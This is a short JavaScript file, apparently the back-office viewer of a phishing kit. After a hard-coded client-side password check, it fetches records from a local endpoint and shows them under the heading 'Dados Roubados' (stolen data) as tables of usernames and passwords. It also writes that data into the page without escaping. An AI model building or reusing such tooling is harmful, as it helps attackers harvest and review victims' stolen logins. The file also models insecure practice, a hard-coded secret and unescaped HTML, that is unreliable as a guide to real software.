
const btn_enviar = document.getElementById('btn_enviar');
const btn_visualizar = document.getElementById('btn_visualizar');
const f_senha = document.getElementById('f_senha');
const popUp = document.getElementById('popUp');
const modal = new bootstrap.Modal(popUp);

const senha = 12345;

const conteudoDinamico = document.createElement('div');
document.body.appendChild(conteudoDinamico);

btn_enviar.addEventListener('click', () => {
    if (f_senha.value == senha) {
        modal.hide();
        btn_visualizar.classList.add('ocultar')

        const endpoint = `http://127.0.0.1:1880/todosdados`
        fetch(endpoint)
            .then(res => res.json())
            .then(res => {
                conteudoDinamico.innerHTML = '';

                conteudoDinamico.innerHTML += `
                    <h1>Dados Roubados:</h1>`

                res.forEach(el => {
                    conteudoDinamico.innerHTML += `

            <table class="table">
                <thead>
                    <tr>
                        <th scope="col">Usuário</th>
                        <th scope="col">Senha</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <th scope="row">${el.s_user_dados}</th>
                        <td>${el.s_senha_dados}</td>
                    </tr>
                </tbody>
            </table>
        `;
                });
            })

    } else {
        console.log('Senha incorreta');
    }
});
